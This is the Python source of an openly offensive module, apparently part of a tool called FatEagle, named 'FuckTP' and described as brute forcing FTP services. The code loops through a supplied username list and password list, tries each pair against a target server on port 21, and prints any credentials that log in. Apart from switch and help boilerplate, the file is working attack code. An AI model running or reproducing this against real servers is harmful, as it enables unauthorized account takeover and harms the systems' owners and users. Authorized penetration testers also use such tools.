import sys
import fescripts.libs.fescripts
from fescripts.libs.PFable import fable,fable_mode
from colorama import init
init()
from colorama import Fore,Back
import signal
import ftplib
from threading import Thread
from fescripts.libs.feio import IPv4
import queue

class FuckTP:
    def signal_handler(self,sig, frame):
      self._end()
    signal.signal(signal.SIGINT, signal_handler)
    _fs = fescripts.libs.fescripts.FE_SCRIPTS("FuckTP","FeScript that brute forces FTP.","""a FeScript that brute forces FTP Services using givven userlist and passlist.""",{'server': {'Body': '', 'Description': 'server address (192.168.1.200)', 'Require': True}, 'userlist': {'Body': '', 'Description': 'path of userlist file', 'Require': True}, 'passlist': {'Body': '', 'Description': 'path of passlist file', 'Require': True}},"0xDeviI")
    q = queue.Queue()
    n_threads = 30
    port = 21
    IPv4Validator = IPv4()

    def __init__(self):
      pass
    
    def help(self):
        print(self._fs._totalDesc)

    def _help(self):
      return self._fs._totalDesc

    def _author(self):
      return self._fs._author
    
    def info(self):
      print(self._fs._miniDesc + "\n    Author: " + self._fs._author)
    
    def _info(self):
      return self._fs._miniDesc

    def allRequirement(self):
      keys = self._fs._Opt.keys()
      allKeys = []
      for i in keys:
        if (self._fs._Opt[i]['Require'] == True):
          allKeys.append(i)
      return allKeys

    def allSwitches(self):
      keys = self._fs._Opt.keys()
      allKeys = []
      for i in keys:
        allKeys.append(i)
      return allKeys

    def _pre_start(self):
      _all_req = self.allRequirement()
      found = False
      for i in _all_req:
        if (self._fs._Opt[i]["Body"] == ""):
          found = True
          break
      if (found):
        print(Fore.RED + "All requirement switches not filled!" + Fore.RESET)   
      else:
        self._start()

    def showSwitch(self,sw):
      print(self._fs._Opt[sw]["Body"])

    def connect_ftp(self, host, user, password):
      server = ftplib.FTP()
      try:
        server.connect(host, self.port, timeout=5)
        server.login(user, password)
      except ftplib.error_perm:
        print(f"[-] Invalid credentials for {user}:{password}")
        return False
      else:
        print(f"{Fore.GREEN}[+] Found :\n\tHOSTNAME: {host}\n\tUSERNAME: {user}\n\tPASSWORD: {password}{Fore.RESET}")
        return True
      finally:
        server.close()

    def _start(self):
      print("\nFatEagle Script ' " + Fore.YELLOW + self.__class__.__name__ + Fore.RESET + " '" + Fore.GREEN + " Started!" + Fore.RESET)
      # --------------------------------------------> Script Started!
      userlist = open(self._fs._Opt["userlist"]["Body"]).read().splitlines()
      passlist = open(self._fs._Opt["passlist"]["Body"]).read().splitlines()
      oper = False
      for _user in userlist:
        if (oper == True):
          break
        for _pass in passlist:
          oper = self.connect_ftp(self._fs._Opt["server"]["Body"],_user, _pass)
          if (oper == True):
            break
      # --------------------------------------------> Script Stopped!
      self._end()

    def _end(self):
      print("FatEagle Script ' " + Fore.YELLOW + self.__class__.__name__ + Fore.RESET + " '" + Fore.RED + " Stopped!\n\n" + Fore.RESET)
    
    def missedSwitch(self):
      fable_data = []
      keys = self._fs._Opt.keys()
      for i in keys:
        if (self._fs._Opt[i].get("Require") == True and self._fs._Opt[i].get("Body") == ""):
          fable_data.append([i,self._fs._Opt[i].get("Body"),self._fs._Opt[i].get("Description")])
      fabled = fable(["switch name","value","descrption"],fable_data,fable_mode.SLICED)
      print(fabled.popData())

    def switchInfo(self):
      fable_data = []
      keys = self._fs._Opt.keys()
      for i in keys:
        fable_data.append([i,self._fs._Opt[i].get("Body"),str(self._fs._Opt[i].get("Require")),self._fs._Opt[i].get("Description")])
      fabled = fable(["switch name","value","required","descrption"],fable_data,fable_mode.SLICED)
      print(fabled.popData())
    
    def setSwitch(self,prop,value):
      if (prop == "server"):
        if (self.IPv4Validator.isValidIPV4Addr(value)):
          self._fs._Opt[prop]["Body"] = value
        else:
          return [False, value + " is not a valid IPv4 Address!"]
      else:
        self._fs._Opt[prop]["Body"] = value
